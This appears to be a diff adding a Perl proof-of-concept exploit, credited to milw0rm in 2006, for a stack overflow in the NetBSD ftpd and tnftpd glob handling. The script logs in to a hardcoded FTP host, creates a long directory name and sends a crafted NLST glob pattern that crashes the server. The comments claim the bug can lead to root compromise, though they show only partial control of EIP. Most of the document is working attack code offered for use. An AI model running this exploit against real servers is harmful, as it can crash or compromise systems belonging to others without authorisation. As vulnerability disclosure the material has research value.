@@ -1,0 +1,67 @@
+#!perl
+# $$$ NetBSD ftpd and ports *Remote ROOOOOT $HOLE$* $$$
+#
+# About
+#
+# tnftpd is a port of the NetBSD FTP server to other systems.
+# It offers many enhancements over the traditional BSD ftpd,
+# including per-class configuration directives via ftpd.conf(5),
+# RFC 2389 and draft-ietf-ftpext-mlst-11 support, IPv6,
+# transfer rate throttling, and more.
+# tnftpd was formerly known as lukemftpd,
+# and earlier versions are present in Mac OS X 10.2 (as ftpd)
+# and FreeBSD 5.0 (as lukemftpd).
+#
+# Description
+#
+# The NetBSD ftpd and the tnftpd port suffer from a remote stack overrun,
+# which can lead to a root compromise.
+#
+# The bug is in glob.c file. The globbing mechanism is flawed as back in
+# 2001.
+#
+# To trigger the overflow you can create a folder and use the globbing
+# special characters (like STARS) to overflow an internal stack based buffer.
+#
+# gdb output tested on NetBSD 3.0 i386 NetBSD-ftpd 20050303 :
+# (gdb) c
+# Continuing.
+#
+# Program received signal SIGSEGV, Segmentation fault.
+# 0x00410041 in ?? ()
+# (gdb)
+#
+# tnftpd-20040810 behaves similar.
+# FreeBSD (lukemftpd) and MacOSX (ftpd) were not tested,
+# however they could have the same bug, because of the same
+# codebase.
+#
+# The problem when exploiting this kind of bug is,
+# that we can only control 0x00410041, not the whole
+# 32 bit. However it looks feasible to find a way
+# to do a hole EIP redirection and/or exploit
+# the bug the "unicode" way, which could be especially
+# hard on BSD systems.
+# kcope
+
+use IO::Socket;
+
+$sock = IO::Socket::INET->new(PeerAddr => '192.168.2.10',
+                             PeerPort => '21',
+                             Proto    => 'tcp');
+$c = "C";
+$a = "C" x 255;
+$d = "A" x 450;
+
+print $sock "USER kcope\r\n";
+print $sock "PASS remoteroot\r\n";
+$x = <stdin>;
+print $sock "MKD $a\r\n";
+print $sock "NLST C*/../C*/../C*/../$d\r\n";
+print $sock "QUIT\r\n";
+
+while (<$sock>) {
+       print;
+}
+
+# milw0rm.com [2006-11-30]
